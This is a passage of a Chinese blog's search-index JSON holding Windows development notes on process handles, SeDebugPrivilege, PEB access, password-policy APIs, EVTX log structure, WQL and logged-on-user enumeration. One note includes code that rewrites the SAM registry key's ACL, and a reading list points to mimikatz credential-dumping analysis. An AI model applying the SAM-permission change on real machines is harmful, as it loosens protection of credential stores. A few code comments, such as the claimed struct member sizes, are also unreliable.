Unknown","tags":[{"name":"powershell","slug":"powershell","permalink":"http://example.com/tags/powershell/"},{"name":"用户","slug":"用户","permalink":"http://example.com/tags/%E7%94%A8%E6%88%B7/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"http://example.com/categories/A-OS/Windows/cmd/"}]},{"title":"windows 导读","date":"2024-01-23T06:09:33.299Z","path":"A_OS/Windows/【win】index/","text":"相关开源项目： imaro&#x2F;RpcEnum at 3251b88a1d03a2f039ec22df7ce52ff851016b12 holdyounger Start List&#x2F; Windows 好文推荐 Analysing RPC With Ghidra and Neo4j - XPN InfoSec Blog 网络靶场实战-安全开发之直接系统调用_ntcreatethreadex-CSDN博客 内核相关： 几个Syscall项目的学习记录 - 先知社区 SAM 注册表： mimikatz源码分析-lsadump模块（注册表）-安全客 - 安全资讯平台","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】开发手册-常用代码段及经验整理","date":"2024-01-23T06:09:29.070Z","path":"A_OS/Windows/【win】Windows开发经验/","text":"[toc] 常用代码段0x01 GetProcessId-获取进程id获取进程id CreateToolhelp32Snapshot Process32First Process32Next 1234567891011121314151617DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125; 12345DWORD dwProcessId = processNameToId(szExeName);if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1;&#125; 0x04 OpenProcess-打开目标进程 OpenProcess 12345HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0;&#125; 0x03 IsWow64-判断目标进程是不是64位123456789101112131415BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;), &quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125; 0x04 Is64BitOs-判断当前机器是不是 64bit。主要用的API为 GetNativeSystemInfo 12345678910111213141516BOOL Is64BitOS()&#123; typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;), &quot;GetNativeSystemInfo&quot;); if (fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123; 0 &#125;; fnGetNativeSystemInfo(&amp;stInfo); if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125; 0x05 EnableDebugPriv-本地提权 OpenProcessToken LookupPrivilegeValue AdjustTokenPrivileges 123456789101112131415161718192021bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125; getProcessAddr-获取目标进程首地址主要逻辑，获取目标进程的快照，检索第一个模块的信息并返回模块的 modBaseAddr CreateToolhelp32Snapshot：获取指定进程以及这些进程使用的堆、模块和线程的快照。 Module32First MODULEENTRY32 1234567891011121314151617181920212223242526272829303132//获取目标进程首地址BOOL CImageBloodDlg::getProcessAddr(DWORD dwPID, DWORD&amp; baseAddr)&#123; HANDLE hModuleSnap = INVALID_HANDLE_VALUE; MODULEENTRY32 me32; // 在目标进程中获取所有进程的snapshot hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); if (hModuleSnap == INVALID_HANDLE_VALUE) &#123; AfxMessageBox(_T(&quot;CreateToolhelp32Snapshot (of modules) fail&quot;)); return(FALSE); &#125; // 设置MODULEENTRY32数据结构大小字段 me32.dwSize = sizeof(MODULEENTRY32); //检索第一个模块的信息，不成功则返回 if (!Module32First(hModuleSnap, &amp;me32)) &#123; AfxMessageBox(_T(&quot;Module32First fail&quot;)); // 显示调用失败 CloseHandle(hModuleSnap); // 清除句柄对象 return(FALSE); &#125; // 从me32中得到基址 baseAddr = (DWORD)me32.modBaseAddr; // 别忘了最后清除模块句柄对象 CloseHandle(hModuleSnap); return(TRUE);&#125; 获取PEB来源：libpeconv&#x2F;libpeconv&#x2F;src&#x2F;peb_lookup.cpp· hasherezade&#x2F;libpeconv 1234567891011121314151617181920inline PPEB get_peb()&#123;#if defined(_WIN64) return (PPEB)__readgsqword(0x60);#else return (PPEB)__readfsdword(0x30);/*//alternative way to fetch it: LPVOID PEB = NULL; __asm &#123; mov eax, fs:[30h] mov PEB, eax &#125;; return (PPEB)PEB; or: LPVOID PEB = RtlGetCurrentPeb();*/#endif&#125; 判断磁盘时候开启了写保护123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * @ brief 判断磁盘是否开启了写保护 * @ param wcDrive 磁盘盘符*/BOOL IsWriteProtected( TCHAR wcDrive )&#123; TCHAR szPath[10] = L&quot;\\\\\\\\.\\\\A:\\0&quot;; szPath[4] = wcDrive; HANDLE hDevice = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL bRet = FALSE; DWORD dwBytesReturn = 0; BOOL bWriteable = ::DeviceIoControl(hDevice, IOCTL_DISK_IS_WRITABLE, NULL, 0, NULL, 0, (LPDWORD) &amp;dwBytesReturn, NULL); if (bWriteable) &#123; bRet = FALSE; &#125; else &#123; bRet = ::GetLastError() == ERROR_WRITE_PROTECT ? TRUE:FALSE; &#125; ::CloseHandle(hDevice); return bRet;&#125; 经验0x01 临时关闭编译告警1234#pragma warning(push)#pragma warning(disable:4305) pCandidate=(VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) 0x02 修改结构体对齐方式使用 #pragma pack(1) 之后，结构体最小对齐的字节为1。好处是可以让编译器按照更紧凑的方式存储数据，从而节省内存空间。 1234567891011121314151617181920struct TestStruct &#123; char a; // 占用1字节 int b; // 占用1字节，与a对齐 double c; // 占用8字节，与b对齐 &#125;; #pragma pack(1) struct TestPackStruct &#123; char a; // 占用1字节 int b; // 占用1字节，与a对齐 double c; // 占用8字节，与b对齐 &#125;; #pragma pack()/*TestStruct size:16TestPackStruct size:13*/ 0x03 未使用的参数、变量消除未使用参数和结构体警告可以使用下面几个宏： 1234#define UNREFERENCED_PARAMETER(P) &#123;(P) = (P);&#125;#define UNREFERENCED_LOCAL_VARIABLE(V) &#123;(V) = (V);&#125;#define DBG_UNREFERENCED_PARAMETER(P) (P)#define DBG_UNREFERENCED_LOCAL_VARIABLE(V) (V)","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【组策略】密码策略","date":"2024-01-23T06:09:20.366Z","path":"A_OS/Windows/组策略/安全设置/账户策略/密码策略/","text":"概述: 组策略-密码策略说明 0x01 密码策略如下图所示： 0x02 详细说明1 放宽最小密码长度限制2 密码必须符合复杂性要求3 密码长度最小值4 密码最短使用期限5 密码最长使用期限注册表：6 强制密码历史7 用户可还原的加密来存储密码8 最小密码长度审核相关API用NetUser函数修改密码策略 可以使用 NetUserModalsGet 来查询密码策略，最后需要使用 NetApiBufferFree 来释放查询到的数据空间。还可以使用 NetUserModalsSet 可以对密码策略进行设定。 12345NET_API_STATUS NetUserModalsGet( _In_opt_ LPCWSTR servername, _In_ DWORD level, _Out_ LPBYTE *bufptr); // 查询密码策略 123NET_API_STATUS NetApiBufferFree( _In_ LPVOID Buffer); // 释放查询的数据空间 123456NET_API_STATUS NetUserModalsSet( _In_ LPCWSTR servername, _In_ DWORD level, _In_ LPBYTE buf, _Out_ LPDWORD parm_err); // 设定密码策略 这两个函数中 level 参数决定了要处理数据的类型，可以取值的内容为 Value Meaning Structure 0 Specifies global password parameters. USER_MODALS_INFO_0 1 Specifies logon server and domain controller information. USER_MODALS_INFO_1 2 Specifies the domain name and identifier. USER_MODALS_INFO_2 3 Specifies lockout information. USER_MODALS_INFO_3 1001 Specifies the minimum allowable password length. USER_MODALS_INFO_1001 1002 Specifies the maximum allowable password age. USER_MODALS_INFO_1002 1003 Specifies the minimum allowable password age. USER_MODALS_INFO_1003 1004 Specifies forced logoff information. USER_MODALS_INFO_1004 1005 Specifies the length of the password history. USER_MODALS_INFO_1005 1006 Specifies the role of the logon server. USER_MODALS_INFO_1006 1007 Specifies domain controller information. USER_MODALS_INFO_1007 如下是使用 NetUserModalsGet 查询时，我们关注的结构体信息 123456789101112typedef struct _USER_MODALS_INFO_0 &#123; DWORD usrmod0_min_passwd_len; // 密码长度最小值 DWORD usrmod0_max_passwd_age; // 密码最长使用期限(秒) DWORD usrmod0_min_passwd_age; // 密码最短使用期限(秒) DWORD usrmod0_force_logoff; // 过期后强制注销的期限(秒) DWORD usrmod0_password_hist_len; // 强制密码历史个数&#125; USER_MODALS_INFO_0, *PUSER_MODALS_INFO_0, *LPUSER_MODALS_INFO_0;typedef struct _USER_MODALS_INFO_3 &#123; DWORD usrmod3_lockout_duration; // 账户锁定时间(秒) DWORD usrmod3_lockout_observation_window; // 重置账户锁定计数器(秒) DWORD usrmod3_lockout_threshold; // 账户锁定阈值&#125; USER_MODALS_INFO_3, *PUSER_MODALS_INFO_3, *LPUSER_MODALS_INFO_3; 使用 NetUserModalsSet 除了以上结构体进行整体设置外，还可以对部分参数进行单独设置 123456789101112131415typedef struct _USER_MODALS_INFO_1001 &#123; DWORD usrmod1001_min_passwd_len; // 密码长度最小值&#125; USER_MODALS_INFO_1001, *PUSER_MODALS_INFO_1001, *LPUSER_MODALS_INFO_1001;typedef struct _USER_MODALS_INFO_1002 &#123; DWORD usrmod1002_max_passwd_age; // 密码最长使用期限(秒)&#125; USER_MODALS_INFO_1002, *PUSER_MODALS_INFO_1002, *LPUSER_MODALS_INFO_1002;typedef struct _USER_MODALS_INFO_1003 &#123; DWORD usrmod1003_min_passwd_age; // 密码最短使用期限(秒)&#125; USER_MODALS_INFO_1003, *PUSER_MODALS_INFO_1003, *LPUSER_MODALS_INFO_1003;typedef struct _USER_MODALS_INFO_1004 &#123; DWORD usrmod1004_force_logoff; // 过期后强制注销的期限(秒)&#125; USER_MODALS_INFO_1004, *PUSER_MODALS_INFO_1004, *LPUSER_MODALS_INFO_1004;typedef struct _USER_MODALS_INFO_1005 &#123; DWORD usrmod1005_password_hist_len; // 强制密码历史个数&#125; USER_MODALS_INFO_1005, *PUSER_MODALS_INFO_1005, *LPUSER_MODALS_INFO_1005; 密码复杂度的处理看到这里是不是发现一个问题，那就是 密码必须符合复杂性要求 这项配置，查询不到。我们可以通过直接读取 SAM 注册表的信息，来判断密码复杂度是否启用 123456789101112131415161718BOOL CheckPwdComplexPolicy()&#123; HKEY hKey = NULL; // 打开密码策略注册表 LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SAM\\\\SAM\\\\Domains\\\\Account&quot;, 0, KEY_ALL_ACCESS, &amp;hKey); if (lResult != ERROR_SUCCESS) return FALSE; // 读取密码策略注册表信息 DWORD dwLen = 1024; BYTE pBuf[1024] = &#123; 0 &#125;; lResult = RegQueryValueEx(hKey, &quot;F&quot;, NULL, NULL, pBuf, &amp;dwLen); RegCloseKey(hKey); if (lResult != ERROR_SUCCESS) return FALSE; // 检查密码复杂度是否启用 if (pBuf[76] != 1) return FALSE; // 复杂度(0未启用)(1已启用) // if (pBuf[80] &lt; 8) return FALSE; // 最小长度 return TRUE;&#125; 普通情况下 SAM 注册表是不允许访问的，就需要我们首先修改一下访问 SAM 的权限 1234567891011121314151617181920212223242526272829303132333435BOOL ModifySamRegPrivilege()&#123; PACL pOldDacl = NULL; PSECURITY_DESCRIPTOR pSID = NULL; // 获取SAM主键的DACL DWORD dRet = GetNamedSecurityInfo(&quot;MACHINE\\\\SAM\\\\SAM&quot;, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &amp;pOldDacl, NULL, &amp;pSID); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pSID); return FALSE; &#125; // 创建一个ACE,允许Administrators组成员完全控制对象,并允许子对象继承此权限 EXPLICIT_ACCESS_A eia = &#123; 0 &#125;; BuildExplicitAccessWithName(&amp;eia, &quot;Administrators&quot;, KEY_ALL_ACCESS, SET_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT); // 将新的ACE加入DACL PACL pNewDacl = NULL; dRet = SetEntriesInAcl(1, &amp;eia, pOldDacl, &amp;pNewDacl); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pSID); return FALSE; &#125; // 更新SAM主键的DACL dRet = SetNamedSecurityInfo(&quot;MACHINE\\\\SAM\\\\SAM&quot;, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pNewDacl); LocalFree(pSID); return FALSE; &#125; return TRUE;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"组策略","slug":"A-OS/Windows/组策略","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/"},{"name":"安全设置","slug":"A-OS/Windows/组策略/安全设置","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"账户策略","slug":"A-OS/Windows/组策略/安全设置/账户策略","permalink":"http://example.com/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5/"}]},{"title":"Windows 事件日志文件——EVTX文件","date":"2024-01-23T06:09:12.434Z","path":"A_OS/Windows/【文件】EVTX文件/","text":"概述：.evtx 是 Windows 事件日志文件的扩展名。这些文件通常包含系统或应用程序的操作信息，如系统警告、错误、信息事件等。这些文件主要被系统管理员用来进行故障排查和系统监控。 Windows 事件查看器是查看 .evtx 文件的主要工具，你可以在 Windows 的控制面板或者通过在 “运行” 对话框中输入 eventvwr.msc 来打开它。在事件查看器中，你可以查看、导出和清除事件日志，还可以创建和管理事件订阅。 .evtx 文件是二进制文件，所以直接用文本编辑器打开它们并不能看到有用的信息。有一些第三方工具，如 NirSoft 的 MyEventViewer 或 Log Parser，可以解析 .evtx 文件并以更易于理解的格式显示事件。 evtx文件概述概述.evtx是Windows事件日志文件的扩展名,全称为Windows XML事件日志格式。Windows事件日志用于记录系统和应用程序在运行过程中发生的不同事件。.evtx文件采用XML格式来存储这些事件信息。每个evtx文件通常对应一个特定的日志类型,如:• System.evtx - 记录系统事件• Application.evtx - 记录应用程序事件• Security.evtx - 记录安全审核事件 如何查看.evtx文件可以使用事件查看器(Windows Event Viewer)来查看和分析。我们还可以使用PowerShell、evtparser等工具来解析evtx文件,例如: 获取evtx文件中的事件ID为1000的所有事件: 1Get-WinEvent -Path application.evtx | Where &#123;$_.Id -eq &quot;1000&quot;&#125; 根据evtx文件中的事件消息筛选事件: 1Get-WinEvent -Path application.evtx | Where &#123;$_.Message -like &quot;*some message*&quot;&#125; 导出evtx文件中的所有事件到CSV文件: 1Get-WinEvent -Path application.evtx | Export-CSV -Path events.csv 使用evtparser解析evtx文件evtparser.py application.evtx &gt; events.logevtx文件的主要作用是进行系统监控、安全审计和事件分析。通过分析evtx文件,我们可以: 了解系统或应用程序的运行状况和遇到的问题 检测系统或应用程序的潜在安全威胁 分析某个时间段内的系统事件,查找可能导致问题的变化 审计对系统的访问和更改等 所以,熟悉evtx文件格式和如何分析evtx文件是信息安全人员和系统管理员的重要技能之一。 EVTX 文件结构evtx文件主要由三部分组成： file header （文件头） chunks （数据块） trailing empty values （尾部填充空值） File Header（文件头）：文件头长度为4KB（4096bytes），其结构如下： 偏移 长度（Bytes） 值 描述 0x00 8 “ElfFile\\x00” 标志位&#x2F;签名 0x08 8 第一个区块编号（存在时间最久的区块编号） 0x10 8 当前区块编号（块的编号从0开始） 0x18 8 下一条事件记录的ID 0x20 4 128 文件头有效部分的大小 0x24 2 1 次要版本 0x26 2 3 主要版本 0x28 2 4096 文件头的大小 0x2A 2 区块的数量 0x2C 76 未知 (空值) 0x78 4 文件标志 0x7C 4 文件头前 120 bytes 的CRC32校验和 0x80 3968 未知 (空值) Chunk(块)：每个块的大小是 65536 bytes（64KB），主要由三部分组成： chunk header 块头 array of event records 事件记录组 unused space 未使用的空间 chunk头长度为512bytes，其结构如下： 偏移 长度（Bytes） 值 描述 0x00 8 “ElfChnk\\x00” 标志位&#x2F;签名 0x08 8 基于日志编号的第一条日志记录的ID 0x10 8 基于日志编号的最后一条日志记录的ID 0x18 8 基于文件编号的第一条日志记录的ID 0x20 8 基于文件编号的最后一条日志记录的ID 0x28 4 128 chunk头大小 0x2C 4 最后一条日志记录的偏移量（相对于块头的起始偏移量） 0x30 4 下一条日志记录的偏移量（相对于块头的起始偏移量） 0x34 4 事件记录数据的 CRC32 校验和 0x38 64 Unknown (空值) 0x78 4 Unknown (flags?) 0x7C 4 块头CRC32校验和（块头前120个字节和128至512字节的数据的CRC32校验和） Event record(事件记录)：事件记录的长度非固定长度，其结构如下： 偏移 长度（Bytes） 值 描述 0x00 4 “\\x2a\\x2a\\x00\\x00” 标志位&#x2F;签名 0x04 4 事件记录的长度 0x08 8 记录ID 0x10 8 日志记录的写入时间（FILETIME） 0x18 不确定 基于二进制XML编码的信息 不确定 4 记录长度（副本） 由上面的信息，可知evtx日志文件包含一个4KB的文件头加后面一定数量的64KB大小的块，一个块中记录一定数量（大约100条）的事件记录。每个块是独立的，不受其他块影响。不会出现一条事件记录的数据存在于两个块中。每条记录包含一个基于二进制XML编码的信息。每条事件记录包含其创建时间与事件 ID（可以用于确定事件的种类），因此可以反映某个特定的时间发生的特定的操作，取证人员可以根据日志文件来发现犯罪的过程。 evtx日志文件大概的结构如下所示： EVTX文件的存储Windows事件日志文件保存在%SystemRoot%\\System32\\Winevt\\Logs路径中。 常见日志文件主要有三个，分别是：System.evtx 、Application.evtx 和Security.evtx。分别是系统日志、应用程序日志和安全日志。 System.evtx 记录操作系统自身组件产生的日志事件，比如驱动、系统组件和应用软件的崩溃以及数据丢失错误等等。 Application.evtx 记录应用程序或系统程序运行方面的日志事件，比如数据库程序可以在应用程序日志中记录文件错误，应用的崩溃记录等。 Security.evtx 记录系统的安全审计日志事件，比如登录事件、对象访问、进程追踪、特权调用、帐号管理、策略变更等。Security.evtx也是取证中最常用到的。 默认情况下，当一个evtx文件的记录满了，日志服务会覆盖最开始的记录，从头开始写入新的记录。也就是相当于一个循环记录的缓存文件。 Evtx日志分析Windows 用 Event ID来标识事件的不同含义，拿Security日志来说，一些常见的Event ID 如下： 事件ID 描述 4608 Windows 启动 4609 Windows 关机 4616 系统时间发生更改 4624 用户成功登录到计算机 4625 登录失败。使用未知用户名或密码错误的已知用户名尝试登录。 4634 用户注销完成 4647 用户启动了注销过程 4648 用户在以其他用户身份登录时，使用显式凭据成功登录到计算机 4703 令牌权限调整 4704 分配了用户权限 4720 已创建用户账户 4725 账户被禁用 4768 请求Kerberos身份验证票证（TGT） 4769 请求Kerberos服务票证 4770 已续订Kerberos服务票证 4779 用户在未注销的情况下断开了终端服务器会话 1、通过Windows事件查看器分析日志通过Windows事件查看器可以查看当前主机的事件日志，也可以打开保存的 evtx文件。 可以通过点击、筛选、查找等多种方式查看事件日志 筛选器提供了丰富的筛选方式： 2、通过工具分析EvtxLog Parser Log Parser（是微软公司自己开发的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它使用类似 SQL 语句一样查询分析这些数据，还可以把分析结果以图表的形式展现出来。 Log Parser下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659 使用方法: 1logparser -i:输入文件的格式 -o:输出文件的格式 &quot;查询语句 和文件路径&quot; 例子： 查询登录成功的事件： 1LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT * FROM E:\\Security.evtx where EventID=4624&quot; Log Parser Studio logparser的GUI版本。 下载地址：https://techcommunity.microsoft.com/t5/exchange-team-blog/log-parser-studio-2-0-is-now-available/ba-p/593266 其界面如下： LogParser Lizard LogParser Lizard 是一个功能丰富的Windows 日志分析软件，可以通过类似SQL查询语句对日志筛选查询进行分析。 下载地址：https://lizard-labs.com/log_parser_lizard.aspx","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【todo】【ntdll】ntdll导出接口","date":"2024-01-23T06:09:09.460Z","path":"A_OS/Windows/【ntdll】ntdll/","text":"概述：windows操作系统 ntdll.dll 学习笔记 ntdll是Windows操作系统核心的一个dll，里边集成了大多数 windows api 所需要的接口。学习 ntdll 有助于我们快速了解 windows API。 0x01、认识 ntdll使用三方工具可以看到，ntdll的导出函数有两千多个，从基本的输入输出到内存操作都覆盖。本文主要记录在工作学习中使用到的相关导出接口，用多少写多少。 0x02、导出接口说明ntdll导出接口说明 1.","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【COM】WQL使用及其测试工具","date":"2024-01-23T06:08:51.926Z","path":"A_OS/Windows/COM/【COM】WQL/","text":"概述：windows wmi的使用 相关链接： WMI C++ 应用程序示例 - Win32 apps | Microsoft Learn holdyounger&#x2F;WMI-RecvEventNotify: wmi的通知查询 使用 WMI - Win32 apps | Microsoft Learn 0x01 工具使用 Windows 自带的 WbemTest 即可。 WQL的使用","tags":[{"name":"WQL","slug":"WQL","permalink":"http://example.com/tags/WQL/"},{"name":"WMI","slug":"WMI","permalink":"http://example.com/tags/WMI/"},{"name":"COM","slug":"COM","permalink":"http://example.com/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"http://example.com/categories/A-OS/Windows/COM/"}]},{"title":"【API】获取当前登录用户","date":"2024-01-23T06:08:51.916Z","path":"A_OS/Windows/API/获取当前登录用户/","text":"概述：调用 winsta.dll 导出接口获取系统当前登录的用户 相关枚举1234567891011121314151617181920212223242526272829303132333435363738394041424344typedef enum _WINSTATIONINFOCLASS&#123; WinStationCreateData, WinStationConfiguration, WinStationPdParams, WinStationWd, WinStationPd, WinStationPrinter, WinStationClient, WinStationModules, WinStationInformation, WinStationTrace, WinStationBeep, WinStationEncryptionOff, WinStationEncryptionPerm, WinStationNtSecurity, WinStationUserToken, WinStationUnused1, WinStationVideoData, WinStationInitialProgram, WinStationCd, WinStationSystemTrace, WinStationVirtualData, WinStationClientData, WinStationSecureDesktopEnter, WinStationSecureDesktopExit, WinStationLoadBalanceSessionTarget, WinStationLoadIndicator, WinStationShadowInfo, WinStationDigProductId, WinStationLockedState, WinStationRemoteAddress, WinStationIdleTime, WinStationLastReconnectType, WinStationDisallowAutoReconnect, WinStationUnused2, WinStationUnused3, WinStationUnused4, WinStationUnused5, WinStationReconnectedFromId, WinStationEffectsPolicy, WinStationType, WinStationInformationEx&#125; WINSTATIONINFOCLASS; 相关结构体123456789101112131415161718192021222324typedef struct _SESSIONIDW &#123; union &#123; ULONG SessionId; ULONG LogonId; &#125; _SessionId_LogonId_union; WINSTATIONNAME WinStationName; WINSTATIONSTATECLASS State;&#125; SESSIONIDW,*PSESSIONIDW;typedef struct _WINSTATIONINFORMATIONW &#123; WINSTATIONSTATECLASS ConnectState; WINSTATIONNAME WinStationName; ULONG LogonId; LARGE_INTEGER ConnectTime; LARGE_INTEGER DisconnectTime; LARGE_INTEGER LastInputTime; LARGE_INTEGER LogonTime; PROTOCOLSTATUS Status; WCHAR Domain[DOMAIN_LENGTH + 1]; WCHAR UserName[USERNAME_LENGTH + 1]; LARGE_INTEGER CurrentTime;&#125; WINSTATIONINFORMATIONW,*PWINSTATIONINFORMATIONW; 导出函数定义1234567typedef BOOL(WINAPI *pfn_WinStationEnumerateW)(_In_opt_ HANDLE hServer, _Out_ PSESSIONIDW *SessionIds, _Out_ PULONG Count);typedef BOOL(WINAPI *pfn_WinStationQueryInformationW)(_In_opt_ HANDLE hServer, _In_ ULONG SessionId, _In_ WINSTATIONINFOCLASS WinStationInformationClass, _Out_writes_bytes_(WinStationInformationLength) PVOID pWinStationInformation, _In_ ULONG WinStationInformationLength, _Out_ PULONG pReturnLength);typedef BOOL(WINAPI *pfn_WinStationFreeMemory)(_In_ PVOID Buffer); 获取登录用户12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485BOOL GetAllLoginUser(vector&lt;CString&gt;&amp; vecUser)&#123; BOOL bRet = FALSE; static pfn_WinStationEnumerateW pWinStationEnumerateW = NULL; static pfn_WinStationFreeMemory pWinStationFreeMemory = NULL; static pfn_WinStationQueryInformationW pWinStationQueryInformationW = NULL; static HMODULE hDll = NULL; if (pWinStationEnumerateW == NULL || pWinStationFreeMemory == NULL || pWinStationQueryInformationW == NULL) &#123; if (hDll == NULL) &#123;#ifdef QHGetCurrentModuleHandleForCheckSign hDll = LoadLibrary_api_s(L&quot;winsta.dll&quot;);#else hDll = LoadLibrary(L&quot;winsta.dll&quot;);#endif // LoadLibrary_api_s &#125; if (hDll) &#123; pWinStationEnumerateW = (pfn_WinStationEnumerateW)GetProcAddress(hDll, &quot;WinStationEnumerateW&quot;); pWinStationFreeMemory = (pfn_WinStationFreeMemory)GetProcAddress(hDll, &quot;WinStationFreeMemory&quot;); pWinStationQueryInformationW = (pfn_WinStationQueryInformationW)GetProcAddress(hDll, &quot;WinStationQueryInformationW&quot;); &#125; if (pWinStationEnumerateW == NULL || pWinStationFreeMemory == NULL || pWinStationQueryInformationW == NULL) &#123; return FALSE; &#125; &#125; PSESSIONIDW pTerm = NULL; ULONG uTermCount = 0; /* DWORD dwSessionID = -1; BOOL bRet = ProcessIdToSessionId(GetCurrentProcessId(), &amp;dwSessionID); if (bRet == FALSE) &#123; return 0; &#125; */ do &#123; DWORD dwSize = sizeof(SESSIONIDW); bRet = pWinStationEnumerateW(NULL, &amp;pTerm, &amp;uTermCount); if (bRet == FALSE) &#123; break; &#125; for (ULONG i = 0; i &lt; uTermCount; ++i) &#123; WINSTATIONINFORMATIONW pStationInfo; ULONG uInfoLen = sizeof(WINSTATIONINFORMATIONW); ULONG uRetLen = 0; if (FALSE == pWinStationQueryInformationW(NULL, pTerm-&gt;_SessionId_LogonId_union.SessionId, WinStationInformation, &amp;pStationInfo, uInfoLen, &amp;uRetLen)) &#123; break; &#125; if (pStationInfo.UserName[0]) &#123; bRet = TRUE; vecUser.push_back(pStationInfo.UserName); //wprintf(L&quot;domain : %s, user : %s \\n&quot;, pStationInfo.Domain, pStationInfo.UserName); &#125; pTerm++; &#125; &#125; while (FALSE); if (pTerm) &#123; pWinStationFreeMemory(pTerm); &#125; return 